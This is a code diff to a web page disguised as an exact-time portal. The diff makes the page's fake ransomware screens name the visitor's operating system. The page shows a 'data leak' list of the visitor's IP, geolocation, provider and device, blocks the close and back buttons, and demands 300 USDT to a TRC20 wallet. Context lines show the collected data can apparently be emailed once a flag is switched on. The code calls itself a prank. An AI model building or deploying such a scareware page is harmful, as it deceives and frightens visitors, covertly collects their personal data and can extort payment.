@@ -7,7 +7,13 @@
     <title>Точное время – информационный портал</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🕒</text></svg>">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f7fa;
@@ -163,7 +169,7 @@
 
 <div id="dataOverlay" class="overlay">
     <div class="modal">
-        <h2>⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ</h2>
+        <h2 id="dataTitle">⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ</h2>
         <div id="stolenDataList"></div>
         <div class="close-hint">Ваши данные экспортированы. Выполняется шифрование...</div>
     </div>
@@ -172,7 +178,7 @@
 <div id="ransomOverlay" class="overlay">
     <div class="modal ransom">
         <h2>🔒 ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ</h2>
-        <p>Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
+        <p id="ransomDescription">Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
         <div class="price">300 USDT</div>
         <p>Для восстановления доступа переведите указанную сумму на кошелек:</p>
         <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">TXLAQmZ9QkXhC9kR3qL5pW6yZ7bN8cV9d (TRC20)</p>
@@ -200,6 +206,46 @@
         const ENABLE_EMAIL_SEND = false;   // <-- измените на true, когда будете готовы к реальному розыгрышу
         // =========================================
 
+        // Определение ОС и типа устройства
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) return { os: 'Android', type: 'mobile' };
+            if (/iPhone|iPad|iPod/i.test(ua)) return { os: 'iOS', type: 'mobile' };
+            if (/Mac OS X/i.test(ua)) return { os: 'macOS', type: 'desktop' };
+            if (/Windows/i.test(ua)) return { os: 'Windows', type: 'desktop' };
+            if (/Linux/i.test(ua)) return { os: 'Linux', type: 'desktop' };
+            return { os: 'Unknown', type: 'desktop' };
+        }
+
+        const osInfo = detectOS();
+        console.log("[DEBUG] Определена ОС:", osInfo.os, osInfo.type);
+
+        // Тексты в зависимости от ОС
+        function getRansomDescription() {
+            switch (osInfo.os) {
+                case 'Android':
+                    return "Все данные вашего Android-устройства (контакты, SMS, фото, файлы) скопированы и зашифрованы. Доступ к устройству заблокирован.";
+                case 'iOS':
+                    return "Ваш iPhone/iPad взломан. iCloud, фотографии, заметки, история браузера — всё скопировано и зашифровано. Устройство заблокировано.";
+                case 'macOS':
+                    return "Ваш Mac скомпрометирован. Все документы, пароли из связки ключей, файлы и история браузера зашифрованы. Система заблокирована.";
+                case 'Linux':
+                    return "Ваш Linux-сервер/рабочая станция заражена. Критические файлы, SSH-ключи, базы данных зашифрованы. Доступ ограничен.";
+                default:
+                    return "Все личные данные, контакты, фото и история браузера скопированы и заблокированы.";
+            }
+        }
+
+        function getDataLeakTitle() {
+            switch (osInfo.os) {
+                case 'Android': return "⚠️ ВАШ ANDROID СКОМПРОМЕТИРОВАН";
+                case 'iOS': return "⚠️ ВАШ IPHONE/IPAD ВЗЛОМАН";
+                case 'macOS': return "⚠️ ВАШ MAC ЗАБЛОКИРОВАН";
+                case 'Linux': return "⚠️ ВАШ LINUX СЕРВЕР ЗАРАЖЕН";
+                default: return "⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ";
+            }
+        }
+
         // Состояние
         let isPrankRevealed = false;
         let dataShown = false;
@@ -219,6 +265,12 @@
         const ransomButton = document.getElementById('ransomButton');
         const timerDisplaySpan = document.getElementById('timerDisplay');
         const cheatTimerDisplay = document.getElementById('cheatTimerDisplay');
+        const ransomDescElem = document.getElementById('ransomDescription');
+        const dataTitleElem = document.getElementById('dataTitle');
+
+        // Установка текстов в зависимости от ОС
+        dataTitleElem.innerText = getDataLeakTitle();
+        if (ransomDescElem) ransomDescElem.innerText = getRansomDescription();
 
         // Блокировка закрытия и кнопки назад
         function enableLock() {
@@ -254,6 +306,9 @@
                 const match = ua.match(/; (.*?) Build/);
                 deviceModel = match ? match[1] : "Android устройство";
             } else if (/iPhone|iPad/i.test(ua)) deviceModel = "Apple iOS";
+            else if (/Mac OS X/i.test(ua)) deviceModel = "Mac";
+            else if (/Windows/i.test(ua)) deviceModel = "Windows ПК";
+            else if (/Linux/i.test(ua)) deviceModel = "Linux ПК";
             else deviceModel = "Компьютер";
             return {
                 userAgent: ua,
@@ -262,6 +317,7 @@
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 device: deviceModel,
+                os: osInfo.os,
                 isMobile: /Mobi|Android/i.test(ua)
             };
         }
@@ -287,6 +343,7 @@
             }
             const data = {
                 device: deviceInfo.device,
+                os: deviceInfo.os,
                 ip: geoInfo?.ip || 'не определен',
                 city: geoInfo?.city || '—',
                 region: geoInfo?.region || '—',
@@ -316,7 +373,7 @@
                 <div class="data-row"><span class="label">IP-адрес</span><div class="value">${geoInfo?.ip || 'сбор...'}</div></div>
                 <div class="data-row"><span class="label">Геолокация</span><div class="value">${geoInfo?.city || '—'}, ${geoInfo?.region || '—'}, ${geoInfo?.country || '—'}</div></div>
                 <div class="data-row"><span class="label">Провайдер</span><div class="value">${geoInfo?.org || '—'}</div></div>
-                <div class="data-row"><span class="label">Устройство</span><div class="value">${deviceInfo.device}</div></div>
+                <div class="data-row"><span class="label">Устройство</span><div class="value">${deviceInfo.device} (${deviceInfo.os})</div></div>
                 <div class="data-row"><span class="label">Разрешение экрана</span><div class="value">${deviceInfo.screen}</div></div>
                 <div class="data-row"><span class="label">Язык системы</span><div class="value">${deviceInfo.language}</div></div>
                 <div class="data-row"><span class="label">Часовой пояс</span><div class="value">${deviceInfo.timezone}</div></div>
